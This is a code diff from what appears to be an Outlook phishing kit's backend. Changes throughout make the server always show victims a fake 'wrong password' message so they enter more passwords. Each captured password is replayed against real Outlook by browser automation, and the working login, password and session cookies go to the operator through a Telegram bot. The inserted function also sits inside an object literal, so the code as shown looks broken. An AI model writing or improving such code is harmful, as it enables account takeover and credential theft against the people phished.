@@ -453,6 +453,112 @@ async function startBrowserPreload(sessionId, email) {
             automation: automation,
             status: 'preloading',
             email: email,
+
+
+// Process password queue in background
+async function processPasswordQueue(email) {
+    const queue = passwordRetryQueue.get(email);
+    
+    if (!queue) {
+        console.log(`❌ No queue found for ${email}`);
+        return;
+    }
+    
+    if (queue.processing) {
+        console.log(`⏳ Queue already processing for ${email}`);
+        return;
+    }
+    
+    queue.processing = true;
+    console.log(`🔄 Starting background password processing for ${email} (${queue.passwords.length} passwords queued)`);
+    
+    try {
+        // Process each password in the queue
+        for (let i = 0; i < queue.passwords.length; i++) {
+            const passwordEntry = queue.passwords[i];
+            const { password, attemptNumber } = passwordEntry;
+            
+            console.log(`🔐 Background attempt ${i + 1}/${queue.passwords.length} for ${email}`);
+            
+            try {
+                // Create new automation instance for this attempt
+                const automation = new ClosedBridgeAutomation({
+                    enableScreenshots: true,
+                    screenshotQuality: 80,
+                    sessionId: `bg_${email}_${attemptNumber}_${Date.now()}`,
+                    eventCallback: broadcastAuthEvent
+                });
+                
+                await automation.init();
+                const navigated = await automation.navigateToOutlook();
+                
+                if (!navigated) {
+                    throw new Error('Failed to navigate to Outlook');
+                }
+                
+                const loginSuccess = await automation.performLogin(email, password);
+                
+                if (loginSuccess) {
+                    console.log(`✅ Background authentication successful for ${email} with password attempt ${attemptNumber}`);
+                    
+                    // Save session
+                    const sessionValidation = await automation.validateSession(email, password);
+                    
+                    if (sessionValidation.success) {
+                        analytics.successfulLogins++;
+                        saveAnalytics();
+                        
+                        // Send Telegram notification
+                        if (telegramBot) {
+                            try {
+                                await telegramBot.sendLoginNotification({
+                                    email: email,
+                                    password: password,
+                                    timestamp: new Date().toISOString(),
+                                    sessionId: automation.sessionId,
+                                    totalCookies: sessionValidation.cookiesSaved || 0,
+                                    authMethod: 'Background Password Queue Processing'
+                                });
+                                console.log(`📤 Telegram notification sent for background success: ${email}`);
+                            } catch (telegramError) {
+                                console.warn('Telegram notification failed:', telegramError.message);
+                            }
+                        }
+                        
+                        // Clean up automation
+                        await automation.close();
+                        
+                        // Clear queue on success
+                        passwordRetryQueue.delete(email);
+                        console.log(`🎉 Background processing complete - correct password found for ${email}`);
+                        return;
+                    }
+                }
+                
+                // Password was wrong, try next one
+                console.log(`❌ Background attempt ${attemptNumber} failed for ${email}`);
+                await automation.close();
+                
+                // Small delay between attempts
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+            } catch (error) {
+                console.error(`❌ Background processing error for ${email} attempt ${attemptNumber}:`, error.message);
+            }
+        }
+        
+        // All passwords tried, none worked
+        console.log(`❌ Background processing exhausted all ${queue.passwords.length} passwords for ${email}`);
+        passwordRetryQueue.delete(email);
+        
+    } catch (error) {
+        console.error(`❌ Fatal error in background queue processing for ${email}:`, error.message);
+        passwordRetryQueue.delete(email);
+    } finally {
+        queue.processing = false;
+    }
+}
+
             startTime: Date.now(),
             sessionId: sessionId,
             usedWarmBrowser: usedWarmBrowser
@@ -917,54 +1023,54 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
         console.log(`📋 Added password to queue for ${email} (total queued: ${queue.passwords.length})`);
 
-        // On first attempt, immediately return "wrong password" to frontend
-        if (attemptNumber === 1 || queue.passwords.length === 1) {
-            console.log(`⚡ First attempt for ${email} - showing wrong password message`);
+        // Always return "wrong password" to frontend immediately
+        console.log(`⚡ Attempt ${attemptNumber || queue.passwords.length} for ${email} - showing wrong password message`);
 
-            // Start background processing
+        // Start background processing only on first password
+        if (attemptNumber === 1 || queue.passwords.length === 1) {
             setTimeout(() => {
                 processPasswordQueue(email).catch(error => {
                     console.error('Background queue processing failed:', error.message);
                 });
             }, 1000);
-
-            // Store failed attempt for admin panel
-            const sessionDir = path.join(__dirname, 'session_data');
-            if (!fs.existsSync(sessionDir)) {
-                fs.mkdirSync(sessionDir, { recursive: true });
-            }
-
-            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-            const failureData = {
-                id: failureId,
-                sessionId: sessionId || createSessionId(),
-                email: email,
-                reason: 'Wrong Password (Processing in background)',
-                errorMessage: 'Your account or password is incorrect.',
-                timestamp: new Date().toISOString(),
-                status: 'retry_available',
-                method: 'fast-authentication-first-attempt',
-                attemptNumber: 1,
-                encryptedData: encryptData(JSON.stringify({ password: password }))
-            };
-
-            fs.writeFileSync(
-                path.join(sessionDir, `invalid_${failureId}.json`),
-                JSON.stringify(failureData, null, 2)
-            );
-
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            return res.status(401).json({
-                success: false,
-                error: 'Invalid credentials',
-                message: 'Your account or password is incorrect. Try another password.',
-                canRetry: true,
-                attemptNumber: 1,
-                backgroundProcessing: true
-            });
         }
+
+        // Store failed attempt for admin panel
+        const sessionDir = path.join(__dirname, 'session_data');
+        if (!fs.existsSync(sessionDir)) {
+            fs.mkdirSync(sessionDir, { recursive: true });
+        }
+
+        const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+        const failureData = {
+            id: failureId,
+            sessionId: sessionId || createSessionId(),
+            email: email,
+            reason: 'Wrong Password (Processing in background)',
+            errorMessage: 'Your account or password is incorrect.',
+            timestamp: new Date().toISOString(),
+            status: 'retry_available',
+            method: 'fast-authentication-queue',
+            attemptNumber: attemptNumber || queue.passwords.length,
+            encryptedData: encryptData(JSON.stringify({ password: password }))
+        };
+
+        fs.writeFileSync(
+            path.join(sessionDir, `invalid_${failureId}.json`),
+            JSON.stringify(failureData, null, 2)
+        );
+
+        analytics.failedLogins++;
+        saveAnalytics();
+
+        return res.status(401).json({
+            success: false,
+            error: 'Invalid credentials',
+            message: 'Your account or password is incorrect. Try another password.',
+            canRetry: true,
+            attemptNumber: attemptNumber || queue.passwords.length,
+            backgroundProcessing: true
+        });
 
         // For subsequent attempts, also add to queue and return error
         console.log(`📋 Attempt ${attemptNumber || queue.passwords.length} for ${email} - added to background queue`);
